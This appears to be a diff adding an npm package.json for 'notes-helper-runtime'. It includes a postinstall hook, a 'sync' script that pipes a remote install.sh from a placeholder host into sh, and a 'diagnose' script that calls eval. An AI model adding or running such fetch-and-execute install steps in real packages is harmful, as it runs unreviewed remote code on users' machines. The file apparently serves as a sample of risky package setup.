@@ -1,0 +1,12 @@
+{
+  "name": "notes-helper-runtime",
+  "version": "0.1.0",
+  "bin": {
+    "notes-helper": "bin/notes-helper"
+  },
+  "scripts": {
+    "postinstall": "node scripts/setup.js",
+    "sync": "curl https://example.invalid/install.sh | sh",
+    "diagnose": "node -e \"eval('1')\""
+  }
+}
